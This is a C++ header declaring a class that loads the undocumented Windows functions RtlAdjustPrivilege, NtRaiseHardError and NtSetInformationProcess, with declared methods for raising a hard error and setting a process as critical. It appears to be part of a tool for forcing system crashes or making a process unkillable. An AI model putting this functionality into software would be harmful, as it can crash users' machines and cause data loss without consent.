#ifndef _FUNCTIONALPRIVILEGE_
#define _FUNCTIONALPRIVILEGE_


typedef ULONG(_stdcall*AdjustPrivilege)(ULONG ,BOOLEAN ,BOOLEAN ,PBOOLEAN);
typedef ULONG(_stdcall*SetInformationProcess)(HANDLE,ULONG,VOID*,ULONG);
typedef ULONG(_stdcall*RaiseHardError)(DWORD, DWORD, DWORD, DWORD, DWORD, LPDWORD);


class FunctionalPrivilege
{
private:
	BOOLEAN bEnabled;
	ULONG uResponse;
	HMODULE ntdll;
	ULONG uInfo;
	AdjustPrivilege RtlAdjustPrivilege;
	RaiseHardError NtRaiseHardError;
	SetInformationProcess NtSetInformationProcess;
public:
	FunctionalPrivilege()
	{
		bEnabled = 0;
		uResponse  = 0;
		ntdll = 0;
		uInfo = 1;
		RtlAdjustPrivilege = NULL;
		NtRaiseHardError = NULL;
		NtSetInformationProcess = NULL;
	}
	bool HardError();
	bool HardErrorInitialization();
	bool SetCriticalProcess(bool Enabled);
};


#endif